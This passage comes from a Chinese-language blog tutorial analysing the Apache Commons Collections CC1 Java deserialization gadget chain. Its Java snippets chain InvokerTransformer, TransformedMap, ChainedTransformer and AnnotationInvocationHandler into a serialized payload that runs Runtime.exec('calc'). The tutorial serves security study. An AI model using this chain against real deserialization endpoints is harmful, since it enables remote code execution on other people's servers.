&#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这边的参数都是可控的，同时重写的transform方法可以调用任意类的任意方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里我们回顾一下如何用反射调用Runtime的exec</span></span><br><span class="line">Runtime r=Runtime.getRuntime();<span class="comment">//Runtime.getRuntime() 是 Runtime 类中的一个静态方法，用来获取当前应用程序运行时的 Runtime 实例。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">c</span>=r.getClass();</span><br><span class="line">Method m=c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">m.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//接下来尝试用transform来调用</span></span><br><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">invokerTransformer.transform(r);</span><br><span class="line"></span><br><span class="line"><span class="comment">//总结:比较上面两种方式，下面的transform相当于模拟了上述的反射过程。</span></span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105195833535.png" class="" title="This is an example image"><p>这里成功执行了命令，那么现在我们已经寻到入口点了，接下来需要一步步回溯，寻找合适的子类，构造漏洞链，直到到达重写了readObject的类。</p><p>所以我们下一步的目标是去找调用 <code>transform</code> 方法的不同名函数。</p><h2 id="构造链子第一步-寻找transform调用处"><a href="#构造链子第一步-寻找transform调用处" class="headerlink" title="构造链子第一步-寻找transform调用处"></a>构造链子第一步-寻找transform调用处</h2><p><strong>寻找哪些类中的哪些方法调用了transform方法</strong></p><p>右键查看用法即可</p><p>那么我们这里直接看到我们需要的TransformedMap类下的checkSetValue方法</p><p>下面我们直接给出构造器和checkSetValue方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#TransformedMap.java   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">   &#125;<span class="comment">//接受参数，实例化TransformedMap这个类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(map);</span><br><span class="line">       <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">       <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">   &#125;<span class="comment">//接受三个参数，第一个为Map,我们可以传入之前讲到的HashMap,第二个和第三个就是Transformer我们需要的了，可控。</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">   &#125;<span class="comment">//返回valueTransformer对应的transform方法，那么我们这里就需要让valueTransformer为我们之前的invokerTransformer对象。相当于就是让这里的valueTransformer=invokerTransformer！！！</span></span><br></pre></td></tr></table></figure><p>但是这里我们发现构造器和checkSetValue方法都是protected权限的，只能本类内部访问，无法外部调用和实例化，那么我们就需要找到内部实例化的工具。也就是上面的一个public静态方法decorate。</p><p>我们可以通过调用decorate方法来实例化TransformedMap类，然后再想办法调用checkSetValue方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//invokerTransformer.transform(r);</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="comment">//静态方法staic修饰直接类名＋方法名调用</span></span><br><span class="line"><span class="comment">//把map当成参数传入，然后第二个参数我们用不着就赋空值null,第三个参数就是我们之前的invokerTransformer.</span></span><br><span class="line">Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">checkSetValueMethod</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);</span><br><span class="line">checkSetValueMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">checkSetValueMethod.invoke(transformedmap,r);</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105202442609.png" class="" title="This is an example image"><h2 id="构造链子第二步-寻找checkSetValue调用处"><a href="#构造链子第二步-寻找checkSetValue调用处" class="headerlink" title="构造链子第二步-寻找checkSetValue调用处"></a>构造链子第二步-寻找checkSetValue调用处</h2><p>checkSetValue寻找用法，发现只有一处调用了checkSetValue(AbstractInputCheckedMapDecorator类的setValue)</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105204710172.png" class="" title="This is an example image"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/** The parent map */</span></span><br><span class="line">       <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">           <span class="built_in">super</span>(entry);</span><br><span class="line">           <span class="built_in">this</span>.parent = parent;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">           value = parent.checkSetValue(value);</span><br><span class="line">           <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>Entry代表的是Map中的一个键值对，而我们在Map中我们可以看到有setValue方法，而我们在对Map进行遍历的时候可以调用setValue这个方法</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105205232375.png" class="" title="This is an example image"><p>而上面副类MapEntry实际上是重写了setValue方法，它继承了AbstractMapEntryDecorator这个类，这个类中存在setValue方法，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractMapEntryDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Map.Entry entry;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> entry.setValue(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而这个类又引入了Map.Entry接口，所以我们只需要进行常用的Map遍历，就可以调用setValue方法,然后水到渠成地调用checkSetValue方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// invokerTransformer.transform(r); &lt;--- 相当于下面的代码是模拟这行代码，实现相同的功能</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;meteorkai&quot;</span>,<span class="string">&quot;meteorkai&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line">Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="comment">//后面是要调用checkSetValue方法，那么可以通过遍历Map来调用setValue方法,然后水到渠成调用checkSetValue方法</span></span><br><span class="line"><span class="keyword">for</span>(Map.Entry entry:transformedmap.entrySet())&#123;<span class="comment">//遍历Map常用格式</span></span><br><span class="line">    entry.setValue(r);<span class="comment">//调用setValue方法，并把对象r当作对象传入</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105210341164.png" class="" title="This is an example image"><p>到这里我们先重头理一下：</p><p>首先，我们找到了TransformedMap这个类，我们需要调用它的checkSetValue方法从而来调用transform方法，但是这个类的构造器和checkSetValue方法都是protected权限，只能从类中访问，所以我们需要用decorate方法来实例化这个类。在此之前我们需要实例化一个hashmap，因为decorate方法中需要传入，并且调用put方法给他赋值以便他遍历map从而调用setValue方法。然后把这个map当成参数传入，实例化成了一个transformedmap对象，这个对象也是Map类型的，然后我们对这个对象进行遍历，在遍历过程中我们可以调用setValue方法，而恰巧又遇到了重写的setValue的副类，这个重写的方法刚好调用了checkSetValue方法，这样就形成了一个闭环。</p><p>但这只是一个小插曲，终究不是我们所希望的readObject方法，我们需要一个readObject方法来代替上述的遍历Map功能。</p><h2 id="构造链子第三步-寻找setValue调用处-链首"><a href="#构造链子第三步-寻找setValue调用处-链首" class="headerlink" title="构造链子第三步-寻找setValue调用处-链首"></a>构造链子第三步-寻找setValue调用处-链首</h2><p><strong>如果能找到一个 <code>readObject()</code> 里面调用了 <code>setValue()</code> 就太好了</strong></p><p>老样子，setValue寻找用法。我勒个豆，直接发现一个调用了setValue的readObject方法。很完美的实现了代替之前Map遍历功能</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105214636730.png" class="" title="This is an example image"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6182022883658399397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        <span class="comment">//接受两个参数，第一个是继承了注解的class，第二个是个Map,第二个参数我们可控，可以传入我们之前的transformedmap类</span></span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到这个类中的memberValues是可控的，这样我们就看传入自己需要的，然后实现setValue方法。根据前面的entry.setValue，那么这里的memberValue就要相当于entry，memberValues就相当于是transformedmap。</p><p>但是这里有个问题，就是我们可以看到定义这个类的时候，并没有public之类的声明，那么说明这个类只能在本包下被调用(sun.reflect.annotation)，我们想要在外部调用，就需要进行反射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">    InvokerTransformer invokertransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    <span class="comment">//invokerTransformer.transform(r);</span></span><br><span class="line">    HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;meteorkai&quot;</span>,<span class="string">&quot;meteorkai&quot;</span>);</span><br><span class="line">    Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokertransformer);</span><br><span class="line">    <span class="comment">/*for(Map.Entry entry:transformedmap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">            entry.setValue(r);</span></span><br><span class="line"><span class="comment">      &#125;*/</span></span><br><span class="line">    <span class="comment">//反射获取AnnotationInvocationHandler类</span></span><br><span class="line">    Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);<span class="comment">//获取构造器</span></span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);<span class="comment">//修改作用域</span></span><br><span class="line">    Object o=constructor.newInstance(Override.class,transformedmap);<span class="comment">//这里第一个是参数是注解的类原型，第二个就是我们之前的类</span></span><br><span class="line">    serialize(o);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    oos.writeObject(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">    ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，当我们满怀期待执行这串代码时，并没有弹出计算器！其实这段代码还是存在很多缺陷的。我们往下分析</p><h2 id="弥补链子缺陷"><a href="#弥补链子缺陷" class="headerlink" title="弥补链子缺陷"></a>弥补链子缺陷</h2><h3 id="一、Runtime类不能序列化"><a href="#一、Runtime类不能序列化" class="headerlink" title="一、Runtime类不能序列化"></a><strong>一、Runtime类不能序列化</strong></h3><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106094958514.png" class="" title="This is an example image"><p>我们跟进Runtime类可以发现他并没有继承serializable接口，不能进行序列化。</p><p>此时我们可以通过反射来获取Runtime类的原型类，它的原型类class是存在serializable接口的，<code>Runtime.class</code> 是可以序列化的。</p><p>那么我们如何获得一个实例化对象呢？可以看到这里存在一个静态的getRuntime()方法，会返回一个Runtime对象，相当于是一种单例模式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class rr=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//获取类原型</span></span><br><span class="line">Method getRuntime=rr.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);<span class="comment">//获取getRuntime方法</span></span><br><span class="line">Runtime r=(Runtime)getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);<span class="comment">//获取实例化对象，因为该方法为无参方法，所以全为null</span></span><br><span class="line">Method exec=rr.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,String.class);<span class="comment">//获取exec方法</span></span><br><span class="line">exec.invoke(r,<span class="string">&quot;calc&quot;</span>);<span class="comment">//执行命令</span></span><br></pre></td></tr></table></figure><p>上述这样就可以实现序列化，那么接下来我们用transform来实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Class rr=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Method getRuntime= rr.getDeclaredMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line"><span class="comment">Runtime r=(Runtime) getRuntime.invoke(null,null);</span></span><br><span class="line"><span class="comment">Method exec=rr.getDeclaredMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">exec.invoke(r,&quot;calc&quot;);*/</span></span><br><span class="line"><span class="comment">//利用transform方法实现上述代码</span></span><br><span class="line">Method getRuntime=(Method)<span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);<span class="comment">//这里模拟获取getRuntime方法，它的具体操作步骤类似之前</span></span><br><span class="line"></span><br><span class="line">Runtime r=(Runtime)<span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntime);<span class="comment">//这里模拟获取invoke方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);<span class="comment">//这里模拟获取exec方法，并进行命令执行</span></span><br></pre></td></tr></table></figure><p>但是这样要一个个嵌套创建参数太麻烦了，我们这里找到了一个Commons Collections库中存在的ChainedTransformer类，它也存在transform方法可以帮我们遍历InvokerTransformer，并且调用transform方法</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106103853342.png" class="" title="This is an example image"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Class rr=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//创建一个Transformer数值用于储存InvokerTransformer的数据，便于遍历</span></span><br><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//调用含参构造器传入Transformer数组，然后调用transform方法，这里对象只需要传一个原始的Runtime就行，因为其他都是嵌套的。</span></span><br><span class="line">ChainedTransformer chainedtransformer=<span class="keyword">new</span> <span class="title class_">Chainedtransformer</span>(transformers);</span><br><span class="line">chainedtransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>第一个问题-Runtime类不能序列化-成功解决，但依然没有弹出计算器。</p><p>不只一个问题。</p><h3 id="二、绕过AnnotationInvocationHandler类readObject方法中的判断条件"><a href="#二、绕过AnnotationInvocationHandler类readObject方法中的判断条件" class="headerlink" title="二、绕过AnnotationInvocationHandler类readObject方法中的判断条件"></a><strong>二、绕过AnnotationInvocationHandler类readObject方法中的判断条件</strong></h3><img 